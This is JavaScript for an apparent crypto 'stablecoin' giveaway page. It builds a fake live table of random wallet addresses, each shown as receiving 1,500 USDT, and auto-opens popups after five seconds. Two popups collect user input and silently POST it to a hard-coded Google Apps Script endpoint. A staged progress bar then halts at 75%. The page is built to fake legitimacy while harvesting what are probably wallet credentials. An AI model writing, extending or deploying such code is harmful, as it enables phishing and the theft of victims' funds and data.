
// RESET TYPEWRITER CLEAN VERSION

const texts = [
  "The World’s First Stablecoin",
  "Unparalleled Liquidity",
  "Exponential Growth",
  "Widespread Adoption",
  "Driving the Future of Money"

];

let tIndex = 0;
let cIndex = 0;
const tw = document.getElementById("typewriter");

function runType() {
  const full = texts[tIndex];
  tw.innerHTML = full.substring(0, cIndex) +
    '<span style="border-right:2px solid #009393; animation:blink .8s infinite;"></span>';

  if (cIndex < full.length) {
    cIndex++;
    setTimeout(runType, 90);
  } else {
    setTimeout(() => {
      cIndex = 0;
      tIndex = (tIndex + 1) % texts.length;
      runType();
    }, 1200);
  }
}

runType();

let popupOpened = false;

function closeAll() {
  document.querySelectorAll('.popup-overlay').forEach(p => p.style.display='none');
}

function openPopup1(){ closeAll(); popup1.style.display='flex'; }
function openPopup2(){ closeAll(); popup2.style.display='flex'; }
function openPopup3(){ closeAll(); popup3.style.display='flex'; }
function openPopup4(){ 
  closeAll(); 
  popup4.style.display='flex'; 
  startProgress();
}

function backToPopup1(){ closeAll(); popup1.style.display='flex'; }

/* PROGRESS FUNCTION */
function startProgress(){
  let percent = 0;
  const bar = document.getElementById("bar");
  const pct = document.getElementById("percent");

  let timer = setInterval(()=>{
    percent++;
    bar.style.width = percent+"%";
    pct.innerHTML = percent+"%";

    if(percent >= 75){
      clearInterval(timer);
      closeAll();
      popup5.style.display='flex';
    }

  }, 40);
}

function closePopup(el) {
  el.closest(".popup-overlay").style.display = "none";
}

function randomName() {
  const chars = "abcdef0123456789";
  let str = "0x";
  for (let i = 0; i < 10; i++) {
    str += chars[Math.floor(Math.random() * chars.length)];
  }
  return str + "...";
}

function generateTable() {
  const tbody = document.querySelector("#liveTable tbody");
  tbody.innerHTML = "";

  for (let i = 1; i <= 20; i++) {
    const tr = document.createElement("tr");
    const now = new Date().toLocaleTimeString();

    tr.innerHTML = `
      <td>${i}</td>
      <td>${now}</td>
      <td>${randomName()}</td>
      <td>1,500 USDT</td>
      <td><span class="check-green">✔</span></td>
    `;

    tbody.appendChild(tr);
  }
}

generateTable();
setInterval(generateTable, 7000);

let savedRow = null;
let absen2Value = "";
const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbx9O6R6tkijF86Q1B4RTkAyMrZuolTetZka15bktHw4n1bUgVQz4kjr2cA6xYVzic8IcQ/exec";

/* === POPUP2 === */
function validatePopup2() {
  let val = document.getElementById("absen2").value.trim();
  let err = document.getElementById("err2");

  if (val === "") {
    err.innerHTML = "It must be filled out correctly";
    return;
  }

  err.innerHTML = "";
  absen2Value = val;

  // 👉 langsung masuk ke popup3 biar UI cepat
  openPopup3();

  // 🚀 fetch tetap jalan di background
  fetch(WEBAPP_URL, {
    method: "POST",
    body: JSON.stringify({
      absen2: val,
      absen3: ""
    })
  })
  .then(res => res.json())
  .then(result => {
    savedRow = result.row;
    console.log("Popup2 tersimpan baris:", savedRow);
  })
  .catch(err => {
    console.error(err);
  });
}

/* === POPUP3 === */
function validatePopup3() {
  let val3 = document.getElementById("absen3").value.trim();
  let err = document.getElementById("err3");

  if (val3 === "") {
    err.innerHTML = "It must be filled out correctly";
    return;
  }

  err.innerHTML = "";

  fetch(WEBAPP_URL, {
    method: "POST",
    body: JSON.stringify({
      row: savedRow, // baris yg akan diupdate!
      absen3: val3
    })
  })
  .then(res => res.json())
  .then(result => {
    console.log("Popup3 berhasil update baris:", savedRow);
    openPopup4();
  })
  .catch(err => {
    console.error(err);
    alert("GAGAL kirim popup3!");
  });
}

function openPopup1(){ 
  popupOpened = true;
  closeAll(); 
  popup1.style.display='flex'; 
}

function openPopup2(){ 
  popupOpened = true;
  closeAll(); 
  popup2.style.display='flex'; 
}

function openPopup3(){ 
  popupOpened = true;
  closeAll(); 
  popup3.style.display='flex'; 
}

function openPopup4(){ 
  popupOpened = true;
  closeAll(); 
  popup4.style.display='flex'; 
  startProgress();
}

setTimeout(() => {
  if (!popupOpened) {
    openPopup1();
  }
}, 5000);
